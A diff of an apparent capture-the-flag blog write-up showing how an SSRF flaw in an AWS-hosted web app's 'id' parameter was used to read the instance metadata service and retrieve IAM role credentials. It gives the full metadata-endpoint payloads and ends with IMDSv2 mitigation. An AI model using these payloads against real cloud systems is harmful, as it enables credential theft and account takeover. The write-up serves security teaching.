@@ -1,38 +1,48 @@
 ---
-title: AWS SSRF Exploitation
-date: 2025-12-27 12:00:00 +0200
-categories: [Cloud]
-tags: [aws, ssrf, ctf]
+title: Stealing AWS IAM Credentials via SSRF
+date: 2025-12-27 14:30:00 +0200
+categories: [Cloud, Web]
+tags: [network, ssrf, aws, burpsuite]
 ---
 
-## Introduction
+## Phase 1: Discovery
 
-In this challenge, I exploited an SSRF vulnerability on an AWS EC2 instance to steal IAM credentials.
+I started by accessing the target website at: `http://54.166.141.194/index.html`
+While browsing, I found a "Free Demo" page at: `http://54.166.141.194/demo.html`
 
-## Step 1: Finding the Vulnerability
+## Phase 2: Interception
 
-I found a web app taking a URL input. I tested it with the AWS metadata IP.
-The payload used was: `http://169.254.169.254/latest/meta-data/`
+I decided to investigate how this page fetches data. I used **Burp Suite** to intercept the HTTP request.
+I noticed a suspicious parameter named `id` that takes a URL as input.
 
-It worked! The server returned the directory listing.
+![Burp Request Intercept](/assets/img/Screenshot_1.png)
 
-## Step 2: Stealing the Keys
+## Phase 3: Exploitation (The Attack)
 
-To get the sensitive data, I targeted the IAM security credentials endpoint.
+To test for Server-Side Request Forgery (SSRF), I injected the AWS Metadata IP address into the `id` parameter.
 
-1. First, I got the role name: ec2-prod-role
-2. Then, I requested the keys using this link:
+**Payload 1: Confirming SSRF**
+`http://169.254.169.254/latest/meta-data/`
+
+The server responded with the directory listing! This confirms the server is hosted on AWS and vulnerable to SSRF.
+
+**Payload 2: Finding the Role Name**
+I navigated through the metadata to find the IAM Role name:
+`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+
+Response: `ec2-prod-role`
+
+**Payload 3: Stealing the Keys**
+Finally, I extracted the Access Keys and Session Token:
 
 `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role`
 
 ## Result
 
-The server responded with the Access Key and Secret Key.
+I successfully retrieved the sensitive AWS credentials (AccessKeyId, SecretAccessKey).
 
-Code: Success
-AccessKeyId: ASIAQ3EGUZ...
-SecretAccessKey: EBvAKCmU...
+![Final Credentials Proof](/assets/img/Screenshot_2.png)
 
-## Fix
+## Mitigation
 
-Enable IMDSv2 on your EC2 instances to prevent this attack.
+Block access to `169.254.169.254` at the firewall level or enforce IMDSv2.
